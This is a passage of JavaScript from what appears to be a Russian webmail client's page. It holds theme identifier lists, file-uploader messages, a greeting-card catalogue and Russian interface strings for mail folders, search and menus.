	var settingsListIds = Array.map("default t1101 t1189 t3000 t1190 t1136 t1135:new t1137:big t1144 t1147 t1148 t1145 t1128 t1131 t1126 t1139:big t1129 t1141 t1142 t1138 t1130 t1146 t1133 t1134 t1140 t1125 t1124 t1151 t1121 t1119:big t1112 t1108:popular t1086:popular,dynamics t1114 t1115 t1116 t1122 t1123 t1120 t1117 t1118 t1105:temporary t1106:temporary t1078:popular t1075:popular t1015:popular,big t1132 t1069 t1071:popular t1081:contrast t1079 t1046 t1047 t1090:popular,dynamics t1087:popular,big t1088:popular t1056:popular,dynamics t1113:dynamics t1109 t1051:popular,temporary t1089 t1149 t1150 t1070 t1064 t1065 t1058:contrast t1057 t1000:popular t1001:popular,big t1007:popular t1003:popular t1004 t1016:dynamics t1006 t1022 t1009 t1011 t1010 t1038 t1027:big t1052 t1008 t1055:popular t1054:popular t1042 t1083 t1077 t1018 t1050 t1053:contrast t1104:contrast t1060:dynamics t1045:contrast t1017 t1080 t1024 t1013 t1040:contrast t1002:contrast,popular,big t1005:contrast,popular t1048:contrast t1031 /  t1063:contrast t1191 t1192 t1193:contrast t1194:contrast t1195 t1196 t1197 t1199:contrast t1198 /  t2018 t2011 t2012 t2013 t2014 t2015 t2016 t2017 t2019 t2020 t2022 t2023 t2024:big t2025 t2026 t2027 t2028 t2031 t2032 t2033 t2034".split(/\s*\/\s*/), function(listStr) {
		return {
			list: _strToList(listStr)
		};
	});


	var tutorialIds = _strToList(" default t1119 t1015 t2024 t2017 t2025 t2018 t2013 t2034 t1086 t1115 t2023 t1190 t1075 t1071 t1116 t2015 t2020 t1120 t2011 t1069 t1117 t1118 t1078");
	var tutorialAdaptiveBgIds = _strToList(" default t1119 t1015 t2024 t2017 t2025 t2018 t2013 t2034 t1086 t1115 t2023 t1190 t1075 t1071 t1116 t2015 t2020 t1120 t2011 t1069 t1117 t1118 t1078");

	 function _getTheme(id) {
		var data = themes[id];

		if(data) {
			data.id = id;
		}

		return data;
	 }

	return {
		getSettingsLists: function() {
			return Array.map(settingsListIds, function (obj) {
				return Array.map(obj.list, _getTheme)
			});
		},

		getInitialList: function() {
			return Array.map(tutorialIds, _getTheme);
		},

		getInitialAdaptiveBgList: function() {
			return Array.map(tutorialAdaptiveBgIds, _getTheme);
		},

		get: _getTheme
	}
})();

</script>


<script type="text/javascript">
patron.fileUploaderSWFStrings = {
	'attachmentLimitExceededNotification': 'Файлы, помеченные этим значком, превышают размер вложения 25 МБ и будут отправлены как ссылки. Ссылки на них появятся в письме автоматически.',
	'sureConfirmation': 'Вы уверены?',
	'processed': 'В обработке:',
	'attached': 'Прикреплено:',
	'file': 'файл',
	'files': 'файла',
	'files2': 'файлов',
	'filesSize': 'Общий размер:',
	'scalingOff': 'Фотографии не будут адаптированы для интернета',
	'scalingOn': 'Фотографии будут адаптированы для интернета',
	'photo': 'фото',

	'mb': 'Мб',
	'kb': 'Кб',
	'gb': 'Гб',

	'compactPhotos': 'Сжимать большие фотографии',
	'doNotCompactPhotos': 'Не сжимать (загружать оригиналы)',

	'change': 'Изменить',
	'attachFiles': '',
	'attachFiles2': '',
	'adaptInternetTitle': 'Адаптировать фотографии для интернета',
	'adaptInternetAbout': 'Для удобства просмотра и ускорения работы\nВаши фотографии можно автоматически сжимать.\nРазмер адаптированной фотографии:\n__scaleSize__ px по большей стороне.',
	'applyToAdded': 'Применить к уже прикрепленным фотографиям',
	'complete': 'Готово',
	'rememberSolution': 'Запомнить мое решение',

	'notification': 'Уведомление',
	'errorOnLoadFiles': 'Произошла ошибка при загрузке следующих файлов: __files__.\nНажмите «Повторить», чтобы попытаться загрузить эти файлы заново.',
	'fileLoadFail': 'Не удалось загрузить файл __filename__. __errorMessage__',
	'attachFilesLimitExceed': 'Вы можете присоединить к письму не более __maxFilesCount__ файлов. Будут загружены первые из выбранных.',
	'photoSizeError': 'Некоторые фотографии слишком большие, поэтому не могут быть адаптированы при отправке.',
	'accessError': 'Локальный файл недоступен.',
	'sizeLimit': 'Размер файла превышает максимально допустимый (1 Гб).',

	'REMAINED_TIME': 'Осталось времени',
	'PROGRESS_LOAD_INTO': 'Добавлено',
	'PROGRESS_UPLOAD': 'Загружено',
	'PHOTOS_INFO': 'Выбранные для загрузки фотографии:',
	'WAIT_FOR_SIZE': 'размер вычисляется...',
	'retry': 'Повторить',
    'cancel': 'Отмена',
	'ok': 'OK'
};
</script>

<script type="text/javascript">
	patron.lang['compose_cards'] = {
		categories: [
			{
				id: 5,
				title: 'С праздником',
				cardTitles: [''],
				items: [
				{
					id: 5019,
					title: 'С Любовью',
					img: {src: '51.jpg', width: 400, height: 400},
					preview: '51i.png',
					counter: 14500055
				}, {
					id: 5020,
					title: 'Поздравляю с 8 марта!',
					img: {src: '52.png', width: 400, height: 400},
					preview: '52i.png',
					counter: 14499942
				}, {
					id: 5021,
					title: 'Поздравляю с 8 марта!',
					img: {src: '53.png', width: 400, height: 400},
					preview: '53i.png',
					counter: 14500027
				}, {
					id: 5022,
					title: 'От всей души',
					img: {src: '54.jpg', width: 400, height: 457},
					preview: '54i.jpg',
					counter: 927652
				}, {
					id: 501,
					title: 'Поздравляю с 23 февраля',
					img: {src: '10.jpg', width: 400, height: 400},
					preview: '10i.jpg',
					counter: 14203191
				}, {
					id: 502,
					title: 'С праздником!',
					img: {src: '3.jpg', width: 400, height: 535},
					preview: '3i.jpg',
					counter: 927605
				}, {
					id: 503,
					title: 'Поздравляю с Новым Годом!',
					img: {src: '001.jpg', width: 400, height: 400},
					preview: '001i.jpg',
					counter: 12909103
				}, {
					id: 504,
					title: 'Поздравляю с Новым Годом!',
					img: {src: '003.jpg', width: 400, height: 400},
					preview: '003i.jpeg',
					counter: 12909104
				}, {
					id: 505,
					title: 'Поздравляю с Новым Годом!',
					img: {src: '002.jpg', width: 400, height: 400},
					preview: '002i.jpg',
					counter: 12930026
				}, {
					id: 506,
					title: 'Веселых зимних праздников!',
					img: {src: '01.jpg', width: 600, height: 423},
					preview: '01i.jpg',
					counter: 3531841
				}, {
					id: 507,
					title: 'Веселых зимних праздников!',
					img: {src: '02.jpg', width: 600, height: 423},
					preview: '02i.jpg',
					counter: 3531844
				}, {
					id: 508,
					title: 'Веселых зимних праздников!',
					img: {src: '03.jpg', width: 600, height: 423},
					preview: '03i.jpg',
					counter: 3531847
				}, {
					id: 509,
					title: 'Веселых зимних праздников!',
					img: {src: '04.jpg', width: 423, height: 600},
					preview: '04i.jpg',
					counter: 3531849
				}, {
					id: 5010,
					title: 'Веселых зимних праздников!',
					img: {src: '05.jpg', width: 600, height: 423},
					preview: '05i.jpg',
					counter: 3531848
				}, {
					id: 5011,
					title: 'Новый год',
					img: {src: '1.jpg', width: 400, height: 533},
					preview: '1i.jpg',
					counter: 927601
				}, {
					id: 5012,
					title: 'С Новым годом!',
					img: {src: '2.jpg', width: 400, height: 533},
					preview: '2i.jpg',
					counter: 927602
				},  {
					id: 5013,
					title: 'Ретро',
					img: {src: '4.jpg', width: 375, height: 500},
					preview: '4i.jpg',
					counter: 927606
				}, {
					id: 5014,
					title: 'С новым годом!',
					img: {src: '5.jpg', width: 400, height: 533},
					preview: '5i.jpg',
					counter: 927608
				}, {
					id: 5015,
					title: 'С Новым годом!',
					img: {src: '6.jpg', width: 400, height: 280},
					preview: '6i.jpg',
					counter: 927610
				}, {
					id: 5016,
					title: 'С Новым годом!',
					img: {src: '7.jpg', width: 400, height: 266},
					preview: '7i.jpg',
					counter: 927611
				}, {
					id: 5017,
					title: 'С Новым годом!',
					img: {src: '8.jpg', width: 400, height: 284},
					preview: '8i.jpg',
					counter: 927612
				}, {
					id: 5018,
					title: 'С Новым годом!',
					img: {src: '9.jpg', width: 400, height: 269},
					preview: '9i.jpg',
					counter: 927613
				}
				]
			},
			{
				id: 1,
				title: 'С днём рождения',
				cardTitles: [
					'Счастливого Дня рождения!',
					'Наилучшие пожелания в твой День рождения!',
					'Пусть исполняются мечты!',
					'Спешу поздравить тебя в этот чудесный день!',
					'Желаю веселого праздника!',
					'Веселого Дня рождения!'
				],
				items: [{
						id: 101,
						title: 'Поздравляю с днем рождения!',
						img: {src: '22.jpg', width: 400, height: 400},
						preview: '22i.jpg',
						counter: 12163616
					}, {
						id: 102,
						title: 'С днем рождения!',
						img: {src: '23.jpg', width: 400, height: 400},
						preview: '23i.jpg',
						counter: 12163639
					}, {
						id: 103,
						title: 'С днем рождения',
						img: {src: '1.jpg', width: 350, height: 350},
						preview: '1i.jpg',
						counter: 927567
					}, {
						id: 104,
						title: 'С днем рождения',
						img: {src: '2.jpg', width: 350, height: 350},
						preview: '2i.jpg',
						counter: 927568
					}, {
						id: 105,
						title: 'Поздравляю',
						img: {src: '3.jpg', width: 350, height: 350},
						preview: '3i.jpg',
						counter: 927569
					}, {
						id: 106,
						title: 'Happy birthday',
						img: {src: '4.jpg', width: 350, height: 350},
						preview: '4i.jpg',
						counter: 927571
					}, {
						id: 107,
						title: 'C днем варенья!',
						img: {src: '5.jpg', width: 350, height: 459},
						preview: '5i.jpg',
						counter: 927573
					}, {
						id: 108,
						title: 'С днем рождения!',
						img: {src: '6.jpg', width: 350, height: 410},
						preview: '6i.jpg',
						counter: 927575
					}, {
						id: 109,
						title: 'С днем рождения',
						img: {src: '7.jpg', width: 350, height: 451},
						preview: '7i.jpg',
						counter: 927576
					}, {
						id: 1010,
						title: 'С днем рождения, дружище!',
						img: {src: '8.jpg', width: 350, height: 491},
						preview: '8i.jpg',
						counter: 927578
					}, {
						id: 1011,
						title: 'Ты так вырос',
						img: {src: '9.jpg', width: 400, height: 560},
						preview: '9i.jpg',
						counter: 927579
					}, {
						id: 1012,
						title: 'С Днем Рождения!',
						img: {src: '10.jpg', width: 400, height: 458},
						preview: '10i.jpg',
						counter: 927581
					}, {
						id: 1013,
						title: 'Чудесный день рождения!',
						img: {src: '11.jpg', width: 343, height: 500},
						preview: '11i.jpg',
						counter: 927582
					}, {
						id: 1014,
						title: 'С Днем рождения',
						img: {src: '12.jpg', width: 400, height: 400},
						preview: '12i.jpg',
						counter: 927583
					}, {
						id: 1015,
						title: 'Лучшие пожелания',
						img: {src: '13.jpg', width: 340, height: 500},
						preview: '13i.jpg',
						counter: 927585
					}, {
						id: 1016,
						title: 'С Днем рождения!',
						img: {src: '14.jpg', width: 400, height: 400},
						preview: '14i.jpg',
						counter: 927586
					}, {
						id: 1017,
						title: 'С Днем рождения!',
						img: {src: '15.jpg', width: 400, height: 400},
						preview: '15i.jpg',
						counter: 927587
					}, {
						id: 1018,
						title: 'С Днем Рождения!',
						img: {src: '16.jpg', width: 400, height: 457},
						preview: '16i.jpg',
						counter: 927588
					}, {
						id: 1019,
						title: 'С любовью',
						img: {src: '17.jpg', width: 400, height: 457},
						preview: '17i.jpg',
						counter: 1142932
					}, {
						id: 1020,
						title: 'С Днем рождения!',
						img: {src: '18.jpg', width: 400, height: 458},
						preview: '18i.jpg',
						counter: 1142933
					}, {
						id: 1021,
						title: 'С Днем рождения!',
						img: {src: '19.jpg', width: 400, height: 457},
						preview: '19i.jpg',
						counter: 1142935
					}, {
						id: 1022,
						title: 'Моей подружке',
						img: {src: '20.jpg', width: 400, height: 457},
						preview: '20i.jpg',
						counter: 1142940
					}, {
						id: 1023,
						title: 'Happy birthday',
						img: {src: '21.jpg', width: 400, height: 457},
						preview: '21i.jpg',
						counter: 1142941
					}
				]
			},

			{
				id: 2,
				title: 'С любовью',
				cardTitles: [
					'С любовью для тебя!',
					'Я хочу признаться тебе в любви!',
					'От всего сердца!',
					'Моему любимому человеку!'
				],
				items: [{
					id: 201,
					title: 'Свидание',
					img: {src: '08.jpg', width: 400, height: 400},
					preview: '08i.jpg',
					counter: 14046540
				}, {
					id: 202,
					title: 'Люблю тебя',
					img: {src: '07.jpg', width: 400, height: 400},
					preview: '07i.jpg',
					counter: 14046281
				}, {
					id: 203,
					title: 'С днем всех влюбленных',
					img: {src: '06.jpg', width: 400, height: 400},
					preview: '06i.jpg',
					counter: 14046239
				}, {
					id: 204,
					title: 'Лови мою валентинку',
					img: {src: '05.jpg', width: 400, height: 400},
					preview: '05i.jpg',
					counter: 14046141
				}, {
					id: 205,
					title: 'Люблю тебя',
					img: {src: '09.jpg', width: 400, height: 400},
					preview: '09i.jpg',
					counter: 14046584
				}, {
					id: 206,
					title: 'Железные мускулы, любящее сердце!',
					img: {src: '01.jpg', width: 700, height: 700},
					preview: '01i.jpg',
					counter: 1427691
				}, {
					id: 207,
					title: 'Обнимаю тебя!',
					img: {src: '02.jpg', width: 700, height: 700},
					preview: '02i.jpg',
					counter: 1430405
				}, {
					id: 208,
					title: 'Наша любовь - космос!',
					img: {src: '03.jpg', width: 700, height: 700},
					preview: '03i.jpg',
					counter: 1430406
				}, {
					id: 209,
					title: 'Любовное послание!',
					img: {src: '04.jpg', width: 700, height: 700},
					preview: '04i.jpg',
					counter: 1430407
				}, {
					id: 2010,
					title: 'От всего сердца',
					img: {src: '1.jpg', width: 350, height: 350},
					preview: '1i.jpg',
					counter: 927616
				}, {
					id: 2011,
					title: 'Я вся такая влюбленная',
					img: {src: '2.jpg', width: 350, height: 350},
					preview: '2i.jpg',
					counter: 927617
				}, {
					id: 2012,
					title: 'С любовью',
					img: {src: '3.jpg', width: 350, height: 350},
					preview: '3i.jpg',
					counter: 927619
				}, {
					id: 2013,
					title: 'Ты лучше всех!',
					img: {src: '4.jpg', width: 350, height: 400},
					preview: '4i.jpg',
					counter: 927620
				}, {
					id: 2014,
					title: 'Love',
					img: {src: '5.jpg', width: 350, height: 350},
					preview: '5i.jpg',
					counter: 927621
				}, {
					id: 2015,
					title: 'Только для тебя',
					img: {src: '6.jpg', width: 371, height: 500},
					preview: '6i.jpg',
					counter: 927624
				}
				]
			},
			
			{
				id: 3,
				title: 'Просто так',
				cardTitles: [''],
				items: [{
						id: 301,
						title: 'Не дуйся!',
						img: {src: '1.jpg', width: 350, height: 350},
						preview: '1i.jpg',
						counter: 927634
					}, {
						id: 302,
						title: 'Ура, пятница!',
						img: {src: '2.jpg', width: 350, height: 490},
						preview: '2i.jpg',
						counter: 927636
					}, {
						id: 303,
						title: 'Не хандри!',
						img: {src: '3.jpg', width: 350, height: 350},
						preview: '3i.jpg',
						counter: 927637
					}, {
						id: 304,
						title: 'Чтобы мечты сбывались!',
						img: {src: '4.jpg', width: 350, height: 350},
						preview: '4i.jpg',
						counter: 927638
					}, {
						id: 305,
						title: 'Ура, пятница!',
						img: {src: '5.jpg', width: 350, height: 350},
						preview: '5i.jpg',
						counter: 927639
					}, {
						id: 306,
						title: 'Тебе',
						img: {src: '6.jpg', width: 350, height: 347},
						preview: '6i.jpg',
						counter: 927642
					}, {
						id: 307,
						title: 'Я дарю тебе...',
						img: {src: '7.jpg', width: 350, height: 494},
						preview: '7i.jpg',
						counter: 927643
					}, {
						id: 308,
						title: 'Здравствуйте,',
						img: {src: '8.jpg', width: 350, height: 350},
						preview: '8i.jpg',
						counter: 927646
					}, {
						id: 309,
						title: 'Настоящему другу',
						img: {src: '9.jpg', width: 350, height: 350},
						preview: '9i.jpg',
						counter: 927649
					}, {
						id: 3010,
						title: 'Время отрываться!',
						img: {src: '10.jpg', width: 400, height: 400},
						preview: '10i.jpg',
						counter: 927651
					}, {
						id: 3012,
						title: 'Клубничка',
						img: {src: '12.jpg', width: 400, height: 464},
						preview: '12i.jpg',
						counter: 927653
					}, {
						id: 3013,
						title: 'Кот',
						img: {src: '13.jpg', width: 400, height: 458},
						preview: '13i.jpg',
						counter: 1146189
					}
				]
			}, {
				id: 4,
				title: 'Ретро',
				cardTitles: [''],
				items: [{
						id: 401,
						title: 'Любимой девушке',
						img: {src: '1.jpg', width: 375, height: 500},
						preview: '1i.jpg',
						counter: 927595
					}, {
						id: 402,
						title: 'Ретро',
						img: {src: '2.jpg', width: 375, height: 500},
						preview: '2i.jpg',
						counter: 927596
					}, {
						id: 403,
						title: 'Ретро',
						img: {src: '3.jpg', width: 375, height: 500},
						preview: '3i.jpg',
						counter: 927598
					}, {
						id: 404,
						title: 'Ретро',
						img: {src: '4.jpg', width: 375, height: 500},
						preview: '4i.jpg',
						counter: 1146191
					}, {
						id: 405,
						title: 'Поздравление маме!',
						img: {src: '10.jpg', width: 400, height: 283},
						preview: '10i.jpg',
						counter: 927599
					}
				]
			},
			{
				id: 6,
				title: 'С 1 сентября!',
				cardTitles: [''],
				items: [
//						{
//							title: 'Здравствуй, школа!',
//							img: {src: '1.jpg', width: 400, height: 400},
//							preview: '1i.jpg',
//							counter: 8664589
//						},
					{
						id: 601,
						title: 'С 1 сентября!',
						img: {src: '2.jpg', width: 400, height: 400},
						preview: '2i.jpg',
						counter: 9506687
					},
					{
						id: 602,
						title: 'С 1 сентября!',
						img: {src: '3.jpg', width: 400, height: 400},
						preview: '3i.jpg',
						counter: 9506702
					},
					{
						id: 603,
						title: 'С 1 сентября!',
						img: {src: '4.jpg', width: 450, height: 350},
						preview: '4i.jpg',
						counter: 9506707
					},
					{
						id: 604,
						title: 'С 1 сентября!',
						img: {src: '5.jpg', width: 400, height: 400},
						preview: '5i.jpg',
						counter: 9518761
					},
					{
						id: 605,
						title: 'С 1 сентября!',
						img: {src: '6.jpg', width: 400, height: 400},
						preview: '6i.jpg',
						counter: 9518775
					}
				]
			}
		]
	};

</script>



	<script type="text/javascript">
require(['toolkit/b-toolkit/b-toolkit'], function (toolkit) {
	$.extend(toolkit.lang, {
		  'loading': 'Загрузка'

		, 'datetime': {
			  'today': 'сегодня'
			, 'months': {
				'short': ["янв", "фев", "мар", "апр", "мая", "июн",
							"июл", "авг", "сен", "окт", "ноя", "дек"]
			}
		}

		, 'addresses': ['адресов', 'адрес', 'адреса']
		, 'correspondents': ['адресатов', 'адресат', 'адресата']

		, 'password':	'Пароль'

		, 'no-subject':	'Без темы'
		, 'no-email':	'Неизвестно'

		, 'btn': {
			  'refresh':	'Обновить'
			, 'thanks.ok':	'Спасибо, всё понятно'
			, 'compose':	'Написать письмо'
			, 'remove':		'Удалить'
			, 'save':		'Сохранить'
			, 'archive':	'В архив'
			, 'cancel':		'Отмена'
			, 'continue':	'Продолжить'
			, 'use':		'Начать пользоваться'
			, 'spam':		'Спам'
			, 'superSpam':	'Точно спам'
			, 'noSpam':		'Не спам'
			, 'unsubscribe':	'Отписаться'
			, 'reply':		'Ответить'
			, 'replyAll':	'Ответить всем'
			, 'forward':	'Переслать'
			, 'send':		'Отправить'
			, 'saveDraft':	'Сохранить'
			, 'saveTemplate':	'Сохранить шаблон'
			, 'clearFolder':	'Очистить папку'
			, 'mailboxSort':	'Настроить фильтрацию рассылок'
			, 'sendRead':	'Отправить подтверждение о прочтении'
			, 'showImages':	'Показать картинки'
			, 'download':	'Скачать'
			, 'toCloud':		'Сохранить в Облако'
			, 'hide':		'Скрыть'
			, 'show':		'Из скрытых'
			, 'scrollToTop':	'Вверх'
			, 'clearMRIM':		'Удалить всю историю переписки'
			, 'search':			'Найти'
			, 'selectAllLetters':	'Отметить все письма'
			, 'deselectAllLetters':	'Снять выделение'
			, 'enter':	'Войти'
			, 'titles': {
				  'refresh':	'Обновить список'
				, 'next':	'Следующая страница'
				, 'prev':	'Предыдущая страница'
				, 'letter_next':	'Следующee письмо'
				, 'letter_prev':	'Предыдущее письмо'
				, 'change_query':	'Изменить запрос'
				, 'back_to_search':	'Вернуться к результатам поиска'
				, 'toCloud':	'Сохранить в облако'
			}
		}

		, 'placeholder': {
			'search.onagent': 'Поиск по истории Агента'
		}


		, 'b-nav_folders': {
			  'title': {
				  empty:		'Нет писем'
				, all:			'Всего'
				, plural: {
					  letter:	['писем', 'письмо', 'письма']
					, unread:	['непрочитанных', 'непрочитанное', 'непрочитанных']
				}
			}

			, 'mrim': patron.ThreeColsEnable ? 'История Агента' : 'История общения в Агенте'
			, 'unread': 'Непрочитанные'
			, 'feedback': 'Оставить отзыв'
			, 'important': 'Отмеченные флажком'

			, 'settings': 'Настроить папки'
			, 'clear_link': 'очистить'
			, 'add_mailbox': 'Добавить ящик'
			, 'disable_new_design': 'Вернуться в старую почту'
			, 'more': 'Ещё'
			, 'hide': 'Свернуть'
			, 'add_collector': 'Добавить ящик'
			, 'threads-on': 'Включить группировку'
			, 'threads-off': 'Выключить группировку'
			, 'folding-title': {
				open: 'Развернуть',
				close: 'Свернуть'
			}
            , 'deleted':  'Удаленные'
		}


		, 'b-nav_search': {
			  'back':			'Назад во «Входящие»'
			, 'correspondence':	'Вся переписка'
			, 'q_to':			'Кому: {0}'
			, 'q_form':			'От: {0}'
			, 'all_folders':	'Найдено во всех папках'
			, 'all_dates':		'Найдено за все время'
			, 'today':			'Сегодня'
			, 'yesterday':		'Вчера'
			, 'week':			'За неделю'
			, 'month':			'За месяц'
			, 'year':			'За {0} год'
			, 'show_only':		'Показывать только'
			, 'only_unread':	'Непрочитанные'
			, 'only_flag':		'Отмеченные флажком'
			, 'only_attach':	'С вложениями'
		}


		, 'b-nav_fileSearch': {
			  'photo':			'Фото и картинки'
			, 'docs':			'Документы'
			, 'music':			'Музыка'
			, 'video':			'Видео'
			, 'other':			'Другие'
			, 'all_types':		'Все типы'
			, 'all_folders':	'Все папки'
			, 'hidden':			'Скрытые'
		}

		, 'b-paginator': {
			'of': 'из'
		}


		, 'b-dropdown': {
			// titles
			'titles': {
				  'view':			'Переключить вид'
				, 'letters-more':	'Ещё'
				, 'letter-more':	'Ещё'
				, 'selectAll':		'Выделить'
				, 'spam-more':	'Спам'
				, 'save-more':	'Сохранить'
				, 'remove-more':	'В архив'
			}
			// ctrl
			, 'view':	'Вид'
			, 'moveTo':	'Переместить'
			, 'markAs':	'Пометить'
			, 'letter-more':	'Ещё'
			, 'letters-more':	'Ещё'
			, 'templates':	'Шаблоны'


			// selectAll: items
			, 'selectAll.': {
				  'all':		'Выделить все письма'
				, 'read':		'Прочитанные'
				, 'unread':		'Непрочитанные'
				, 'flagged':	'Помеченные флажком'
				, 'attach':		'С файлами'
				, 'none':		'Снять выделение'
			}

			, 'selectAllFiles.': {
				  'all':		'Выделить все файлы'
				, 'none':		'Снять выделение'
			}

			// view: items
			, 'view.': {
				  'threads-on': 'Включить группировку'
				, 'threads-off': 'Выключить группировку'
				, 'compact': 'Компактный'
				, 'detail': 'Расширенный'
				, 'sort_date_asc': 'По дате, сначала старые'
				, 'sort_date_desc': 'По дате, сначала новые'
				, 'sort_to_asc': 'По получателю, от А до Я'
				, 'sort_to_desc': 'По получателю, от Я до А'
				, 'sort_from_asc': 'По автору, от А до Я'
				, 'sort_from_desc': 'По автору, от Я до А'
				, 'sort_subj_asc': 'По теме, от А до Я'
				, 'sort_subj_desc': 'По теме, от Я до А'
			}


			// markAs: items
			, 'markAs.': {
				  'hint': 'Отметьте галочками нужные письма'
				, 'read': 'Прочитанным'
				, 'unread': 'Непрочитанным'
				, 'flag_yes': 'Пометить флажком'
				, 'flag_no': 'Снять флажок'
			}


			// moveTo: items
			, 'moveTo.': {
				  'hint': 'Отметьте галочками нужные письма'
				, 'new_folder': 'Создать новую папку'
			}

			// archive: items
			, 'remove-more.': {
				'archive': 'В архив'
			}


			// Letters.more: items
			, 'letters-more.': {
				  'read': 'Пометить прочитанным'
				, 'unread': 'Пометить непрочитанным'
				, 'flag_yes': 'Пометить флажком'
				, 'flag_no': 'Снять флажок'
				, 'hint': 'Отметьте галочками нужные письма'
				, 'addressbook':	'Добавить в адреса'
				, 'create_filter':	'Создать фильтр'
				, 'search':			'Найти все письма'
				, 'forward':		'Переслать как вложение'
			}

			// Letter more: items
			, 'letter-more.': {
				  'read': 'Пометить прочитанным'
				, 'unread': 'Пометить непрочитанным'
				, 'flag_yes': 'Пометить флажком'
				, 'flag_no': 'Снять флажок'

				, 'reply': "Ответить"
				, 'replyAll': "Ответить всем"
				, 'forward': "Переслать"

				, 'moveTo': "Переместить"
				, 'remove': "Удалить"
				, 'spam': 'Спам'

				, 'addressbook':	'Добавить в адреса'
				, 'blacklist':		'В черный список'
				, 'create_filter':	'Создать фильтр'
				, 'search':			'Найти все письма'
				, 'translate':		'Перевести письмо'
				, 'print':			'Распечатать'
				, 'download':		'Скачать на компьютер'
				, 'redirect':		'Перенаправить'
				, 'as-attach':		'Переслать как вложение'
				, 'headers':		'Служебные заголовки'
				, 'newWin':		'Открыть в новом окне'
			}

			// Spam: items
			, 'spam-more.': {
				  'spam':			'Отправить в спам'
				, 'noSpam':			'Не спам'
				, 'unsubscribe':	'Отписаться'
				, 'super_spam':		'Точно спам'
				, 'super_nospam':		'Точно не спам'
			}

			// Save: items
			, 'save-more.': {
				  'saveDraft':		'Сохранить черновик'
				, 'saveTemplate':	'Сохранить шаблон'
			}

			// templates: items
			, 'templates.': {
				  'new':	'Создать шаблон'
				, 'save':	'Сохранить шаблон'
				, 'load':	'Загружаем шаблоны...'
			}

			// Letters: contextmenu
			, 'contextmenu.': {
				  'newtab':			'Открыть в новой вкладке'
				, 'newwindow':		'Открыть в новом окне'
				, 'remove':			'Удалить'
				, 'spam':			'Спам'
				, 'noSpam':			'Не спам'
				, 'moveTo':			'Переместить в папку'
				, 'read':			'Пометить прочитанным'
				, 'unread':			'Пометить непрочитанным'
				, 'search':			'Найти все письма'
				, 'create_filter':	'Создать фильтр'
				, 'rename':			'Переименовать'
				, 'clear':			'Очистить'
				, 'open':			'Открыть'
				, 'download':		'Скачать'
				, 'toCloud':		'Сохранить в Облако'
				, 'forward':		'Переслать'
				, 'hideFile':		'Скрыть'
				, 'showFile':		'Из скрытых'
				, 'copy':			'Копировать адрес'
				, 'copys':			'Копировать адреса'
				, 'compose':		'Написать письмо'
				, 'add':			'Добавить в контакты'
			}
		}


		, 'b-datalist_letters__empty': {
			  'inbox':   'В этой папке писем нет'
			, 'spam':    'В папке Спам писем нет'
			, 'drafts':  'У вас нет незавершенных писем'
			, 'sent':    'У вас нет отправленных писем'
			, 'trash':   'Ваша корзина пуста'
			, 'user':   'В данной папке писем нет'
			, 'archive':   'В данной папке писем нет'
			, 'templates': 'У вас нет шаблонов писем. <a data-mnemo=\"new_template_link\" rel=\"history\" href=\"/compose?templates\">Создать&nbsp;шаблон</a>'
			, 'default': 'В данной папке писем нет'
		  }

		, 'b-datalist_filesearch__empty': 'Пока файлов нет.<br/><br/>В этом разделе вы сможете найти все файлы, которые вы отправляли или вам присылали в письмах.'

		, 'b-datalist__empty_collector': 'Идет сбор почты'

		, 'b-datalist_search__empty': {
			  'unread': 'Непрочитанных писем нет.'
			, 'query': 'По запросу <span class=\'b-datalist__empty__text b-datalist__empty__text-content\'>«#q_query#</span>» ничего не найдено.'
			, 'no_query': 'По вашему запросу ничего не найдено.'
			, 'search': '<a rel=\"history\" href=\"/search/?q_query=*\">Искать все письма</a>.'
			, 'search_in_all_folders': '<a rel=\"history\" href=\"/search/?q_query=#q_query#\">Искать во всех папках</a>.'
			, 'search_in_trash': '<a rel=\"history\" href=\"/search/?q_query=#q_query#&q_trash=1\" data-mnemo=\"search_in_trash\" data-rb=\"show\">Искать в папках «Спам» и «Корзина»</a>.'
			, 'search_from_in_trash': '<a rel=\"history\" href=\"/search/?q_from=#q_from#&q_trash=1\" data-mnemo=\"search_in_trash\" data-rb=\"show\">Искать в папках «Спам» и «Корзина»</a>.'
			, 'search_to_in_trash': '<a rel=\"history\" href=\"/search/?q_to=#q_to#&q_trash=1\" data-mnemo=\"search_in_trash\" data-rb=\"show\">Искать в папках «Спам» и «Корзина»</a>.'
			, 'search_subject_in_trash': '<a rel=\"history\" href=\"/search/?q_subj=#q_subj#&q_trash=1\" data-mnemo=\"search_in_trash\" data-rb=\"show\">Искать в папках «Спам» и «Корзина»</a>.'
			, 'search_all_time': '<a rel=\"history\" href=\"/search/?q_query=#q_query#\">Искать за все время</a>.'
		}


		, 'b-letter': {
			  'header': {
				  'to':		'Кому'
				, 'cc':		'Копия'
				, 'bcc':	'Скрытая'
				, 'from':	'От кого'
				, 'resentto':	'Переадресовано для'
				, 'resentfrom':	'Переадресовано от'
				, 'resentdate':	'Дата переадресации'
				, 'resentcomment':	'Комментарий'
				, 'nosubject':	'Без темы'
                , 'create-event': 'Создать событие'

            }

			, 'headers': {
				'expand': 'подробнее',
				'collapse': 'скрыть'
			}

			, 'fast_compose': {
				'action': 'Нажмите, чтобы <span data-compose-act=\"reply\" class=\"b-letter__foot__tab\">Ответить</span>, <span data-compose-act=\"replyAll\" class=\"b-letter__foot__tab\">Ответить всем</span> или <span data-compose-act=\"forward\" class=\"b-letter__foot__tab\">Переслать</span>'
			}

			, 'secure': 'Введите пароль для доступа к папке «FOLDER_NAME»'
            , 'secure-subject':	'Письмо из папки, защищенной паролем'
			, 'show-thread': 'Показать всю группу'

			, 'addresses': {
				  'more': 'и ещё'
				, 'collapse': 'свернуть'
			}

			, 'b-sent': {
				  'title': {
					  reply: 'Ваш <a href=\"%message\" rel=\"history\">ответ</a> отправлен. <a href=\"%back\" rel=\"history\">Вернуться к исходному письму</a>'
					, forward: 'Ваше <a href=\"%message\" rel=\"history\">письмо</a> отправлено. <a href=\"%back\" rel=\"history\">Вернуться к исходному письму</a>'
					, inbox: 'Ваше <a href=\"%message\" rel=\"history\">письмо</a> отправлено. <a href=\"%back\" rel=\"history\" cnt_sb=\"964649\">Перейти во Входящие</a>'
				  }
				, 'header': {
					  'to':  'Получатели'
					, 'cc':  'Копии'
					, 'bcc': 'Скрытые копии'
                  }
				, 'back': 'Перейти во Входящие'
			}
		}

		, 'b-slot': {
			'social':  {
				title: 'Follow us on these social networks'
			}
		}

		, 'b-informer': {
			  'what':			'Что это?'
			, 'details':		'Подробнее'
			, 'folder.spam':	'Внимание! Письма, перемещенные в Спам более месяца назад, будут автоматически удаляться.'
